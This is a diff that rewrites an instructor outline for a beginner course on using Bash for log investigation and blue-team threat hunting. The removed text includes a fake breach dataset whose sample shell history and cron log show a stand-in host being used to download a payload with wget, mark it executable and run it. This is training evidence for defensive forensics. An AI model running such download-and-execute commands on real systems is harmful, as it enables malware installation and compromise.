@@ -1,97 +1,122 @@
-# Instructor Slide Deck Outline (16 Hours)
+# Instructor Slide Deck Outline (Beginner-First, ~16 Hours)
 
-Design intent: minimal theory, maximum operational relevance. Each block ends with a short investigation lab so students immediately apply commands.
+Design intent: assume students know nothing. Teach slowly, check often, and connect every command to an investigation question.
 
----
+## Topic 0 - Orientation (45 min)
 
-## Module 1 - Why Bash Matters for Cybersecurity (30 min)
+### Objective
+
+Define cybersecurity terms and remove fear before terminal work.
 
 ### Slides
 
-- Course objectives
-- Blue team workflow: logs -> investigation -> evidence
-- Why defenders rely on Bash pipelines
-- Real-world SOC workflow example
-- Overview of the final project
+- what blue team work is
+- what Linux is
+- what terminal and shell mean
+- class map from zero to final tool
 
-Example investigation pipeline:
+### Checkpoint
+
+- students can explain Linux and terminal in plain language
+
+## Topic 1 - First Contact With Terminal (1.5 hr)
+
+### Objective
+
+Students can run basic commands and recover from mistakes.
+
+### Commands
 
 ```bash
-grep "Failed password" auth.log | awk '{print $11}' | sort | uniq -c | sort -nr
+whoami
+date
+clear
+man ls
+ls --help
 ```
 
-Outcome: identify attacker IPs quickly.
+### Teaching notes
 
----
+- show where to type
+- normalize errors
+- show `Ctrl+C`
 
-## Module 2 - Linux Terminal Fundamentals (1 hr)
+### Checkpoint
 
-### Topics
+- all students run `whoami` and `date` successfully
 
-- shell vs terminal
-- Linux filesystem layout
-- navigating directories
-- help documentation
+## Topic 2 - Linux Is Organized (1.5 hr)
+
+### Objective
+
+Students can navigate directories and understand paths.
 
 ### Commands
 
 ```bash
 pwd
 ls
-cd
-man
-history
-```
-
-Security context:
-
-- attackers hide files
-- defenders must locate them
-
-Example:
-
-```bash
 ls -la
+cd
+find
 ```
 
----
+### Concepts
 
-## Module 3 - Working With Logs (1.5 hr)
+- current directory
+- home directory
+- relative vs absolute paths
+- where logs live (`/var/log`, course `logs/`)
 
-### Topics
+### Checkpoint
 
-- what logs are
-- common Linux logs
+- each student enters `logs/` and returns to parent
 
-### Examples
+## Topic 3 - Reading Files (1.5 hr)
 
-```text
-/var/log/auth.log
-/var/log/syslog
-/var/log/apache2/access.log
-```
+### Objective
+
+Students can inspect large logs safely.
 
 ### Commands
 
 ```bash
 cat
-less
 head
 tail
-wc
+wc -l
+less
 ```
 
-Example investigation:
+### Checkpoint
+
+- each student opens `logs/auth.log` in `less` and exits with `q`
+
+## Topic 4 - Finding What Matters (2 hr)
+
+### Objective
+
+Students can locate suspicious patterns with `grep`.
+
+### Commands
 
 ```bash
-grep "Failed password" auth.log
+grep "Failed password" logs/auth.log
+grep -i "cron" logs/syslog
+grep -c "Failed password" logs/auth.log
+grep -E "Failed password|Accepted password" logs/auth.log
+grep -n "Accepted password" logs/auth.log
 ```
 
----
+### Checkpoint
 
-## Module 4 - Pipes and Redirection (2 hr)
+- each student finds at least one failed and one accepted login event
 
-Concept: small tools chained together.
+## Topic 5 - Pipelines and Redirection (1.5 hr)
+
+### Objective
+
+Students understand command chaining.
 
 ### Operators
 
@@ -101,334 +126,100 @@ Concept: small tools chained together.
 >>
 ```
 
-Example investigation:
+### Demo pipeline
 
 ```bash
-grep "Failed password" auth.log | wc -l
+grep "Failed password" logs/auth.log | wc -l
 ```
 
-Advanced pipeline:
+### Checkpoint
+
+- each student explains what each side of `|` is doing
+
+## Topic 6 - Pulling Data Out (2 hr)
+
+### Objective
+
+Students extract fields and rank attacker IPs.
+
+### Commands
 
 ```bash
-grep "Failed password" auth.log | awk '{print $11}'
+cut -d' ' -f1 logs/access.log | head
+grep "Failed password" logs/auth.log | awk '{print $11}'
+grep "Failed password" logs/auth.log | awk '{print $11}' | sort | uniq -c | sort -nr
 ```
 
----
+### Checkpoint
 
-## Module 5 - Threat Hunting With grep (2 hr)
+- each student identifies the top attacker IP
 
-Focus: pattern detection.
+## Topic 7 - Threat Hunting Labs (1.5 hr)
 
-### Key Flags
+### Objective
+
+Students complete full manual investigations without scripting.
+
+### Required findings
+
+- top attacker IP
+- compromised account
+- suspicious download
+- persistence indicator
+- timeline events
+
+## Topic 8 - Writing Scripts (1.5 hr)
+
+### Objective
+
+Students automate repeated workflows.
+
+### Commands and concepts
 
 ```bash
-grep -i
-grep -r
-grep -n
-grep -E
+nano tools/my_investigator.sh
+chmod +x tools/my_investigator.sh
+./tools/my_investigator.sh logs/auth.log
 ```
 
-### Examples
-
-Find malware download:
-
-```bash
-grep "wget" syslog
-```
-
-Find suspicious commands:
-
-```bash
-grep "chmod" bash_history.log
-```
-
----
-
-## Module 6 - awk and sed for Log Parsing (3 hr)
-
-### awk Examples
-
-Extract IPs:
-
-```bash
-awk '{print $11}'
-```
-
-Count attackers:
-
-```bash
-awk '{print $11}' auth.log | sort | uniq -c
-```
-
-### sed Examples
-
-Clean logs:
-
-```bash
-sed '/session opened/d'
-```
-
-Highlight events:
-
-```bash
-sed 's/Failed password/FAILED/g'
-```
-
----
-
-## Module 7 - Bash Scripting (2 hr)
-
-Script structure:
-
-```bash
-#!/bin/bash
-LOGFILE=$1
-grep "Failed password" "$LOGFILE"
-```
-
-### Concepts
-
+- shebang
 - variables
-- script arguments
-- permissions
+- `$1` arguments
+- `if/else`
+- simple loops
+
+## Topic 9 - Building the Final Tool (2 hr)
+
+### Objective
+
+Students assemble and use `incident_analyzer.sh`.
+
+### Required modes
 
 ```bash
-chmod +x script.sh
+./incident_analyzer.sh logs/auth.log --summary
+./incident_analyzer.sh logs/auth.log --top-ips
+./incident_analyzer.sh logs/auth.log --timeline
+./incident_analyzer.sh logs/access.log --suspicious-downloads
 ```
 
----
-
-## Module 8 - Automation With Loops (1.5 hr)
-
-Example:
-
-```bash
-for file in logs/*.log
-do
-    echo "Analyzing $file"
-done
-```
-
-Security application: analyzing multiple hosts.
-
----
-
-## Module 9 - Building the Investigation Tool (2.5 hr)
-
-Students assemble:
-
-```text
-incident_analyzer.sh
-```
-
-### Capabilities
-
-- detect brute force attacks
-- identify attacker IPs
-- build attack timeline
-
----
-
-## 2. Fake Breach Dataset
-
-Create a folder:
-
-```text
-cyber_lab_logs/
-```
-
-Contents:
-
-```text
-auth.log
-access.log
-bash_history.log
-syslog
-```
-
-### auth.log
-
-```text
-Jul 10 09:15:02 server sshd[1423]: Failed password for root from 185.220.101.4 port 45512 ssh2
-Jul 10 09:15:03 server sshd[1424]: Failed password for admin from 185.220.101.4 port 45513 ssh2
-Jul 10 09:15:07 server sshd[1425]: Failed password for admin from 185.220.101.4 port 45514 ssh2
-Jul 10 09:16:10 server sshd[1426]: Accepted password for admin from 185.220.101.4 port 45518 ssh2
-Jul 10 09:18:11 server sshd[1430]: session opened for user admin
-```
-
-### access.log
-
-```text
-185.220.101.4 - - [10/Jul/2024:09:19:01] "GET /admin HTTP/1.1" 200
-185.220.101.4 - - [10/Jul/2024:09:19:05] "GET /backup.zip HTTP/1.1" 200
-91.134.14.73 - - [10/Jul/2024:09:20:12] "GET /login HTTP/1.1" 404
-```
-
-### bash_history.log
-
-```text
-ls
-whoami
-wget http://malicious.site/payload.sh
-chmod +x payload.sh
-./payload.sh
-```
-
-### syslog
-
-```text
-Jul 10 09:20:15 server CRON[1500]: (admin) CMD (wget http://malicious.site/payload.sh)
-Jul 10 09:20:17 server kernel: suspicious outbound connection to 45.77.88.2
-```
-
-### Student Investigation Questions
-
-Students must determine:
-
-- attacker IP
-- compromised user
-- malware download command
-- time of compromise
-
----
-
-## 3. Bash Attack Simulator
-
-This creates live logs students can analyze.
-
-File:
-
-```text
-attack_simulator.sh
-```
-
-Script:
-
-```bash
-#!/bin/bash
-
-LOGFILE="simulated_auth.log"
-ATTACK_IP="185.220.101.4"
-
-while true
-do
-echo "$(date '+%b %d %H:%M:%S') server sshd[$RANDOM]: Failed password for root from $ATTACK_IP port $RANDOM ssh2" >> $LOGFILE
-sleep 1
-
-echo "$(date '+%b %d %H:%M:%S') server sshd[$RANDOM]: Failed password for admin from $ATTACK_IP port $RANDOM ssh2" >> $LOGFILE
-sleep 1
-
-if [ $((RANDOM % 10)) -eq 1 ]; then
-echo "$(date '+%b %d %H:%M:%S') server sshd[$RANDOM]: Accepted password for admin from $ATTACK_IP port $RANDOM ssh2" >> $LOGFILE
-fi
-
-sleep 2
-done
-```
-
-Students investigate in real time using:
-
-```bash
-tail -f simulated_auth.log
-```
-
-Example investigation:
-
-```bash
-grep "Failed password" simulated_auth.log | awk '{print $11}'
-```
-
----
-
-## 4. Reference Solution (Final Tool)
-
-File:
-
-```text
-incident_analyzer.sh
-```
-
-Script:
-
-```bash
-#!/bin/bash
-
-LOGFILE=$1
-OPTION=$2
-
-if [ -z "$LOGFILE" ]; then
-    echo "Usage: $0 logfile [--failed-logins | --top-ips | --timeline]"
-    exit 1
-fi
-
-failed_logins() {
-grep "Failed password" "$LOGFILE"
-}
-
-top_ips() {
-grep "Failed password" "$LOGFILE" \
-| awk '{print $11}' \
-| sort \
-| uniq -c \
-| sort -nr
-}
-
-timeline() {
-grep -E "Failed password|Accepted password" "$LOGFILE"
-}
-
-case $OPTION in
-    --failed-logins)
-        failed_logins
-        ;;
-    --top-ips)
-        top_ips
-        ;;
-    --timeline)
-        timeline
-        ;;
-    *)
-        echo "Invalid option"
-        ;;
-esac
-```
-
-Example usage:
-
-```bash
-./incident_analyzer.sh auth.log --top-ips
-```
-
-Output:
-
-```text
-38 185.220.101.4
-12 91.134.14.73
-```
-
----
-
-## Recommended Class Repository Structure
-
-Provide students with:
-
-```text
-bash-cyber-course/
-|
-|-- logs/
-|   |-- auth.log
-|   |-- access.log
-|   |-- syslog
-|
-|-- labs/
-|   |-- lab1_navigation.md
-|   |-- lab2_logs.md
-|
-|-- tools/
-|   |-- attack_simulator.sh
-|
-`-- final_project/
-    `-- incident_analyzer.sh
-```
-
-This keeps the course organized and easy to run.
+### Checkpoint
+
+- students can explain findings, not just run commands
+
+## Timing Summary
+
+| Topic | Duration |
+| --- | --- |
+| 0 | 0.75 hr |
+| 1 | 1.5 hr |
+| 2 | 1.5 hr |
+| 3 | 1.5 hr |
+| 4 | 2.0 hr |
+| 5 | 1.5 hr |
+| 6 | 2.0 hr |
+| 7 | 1.5 hr |
+| 8 | 1.5 hr |
+| 9 | 2.0 hr |
+
+Total: 16.25 hours.
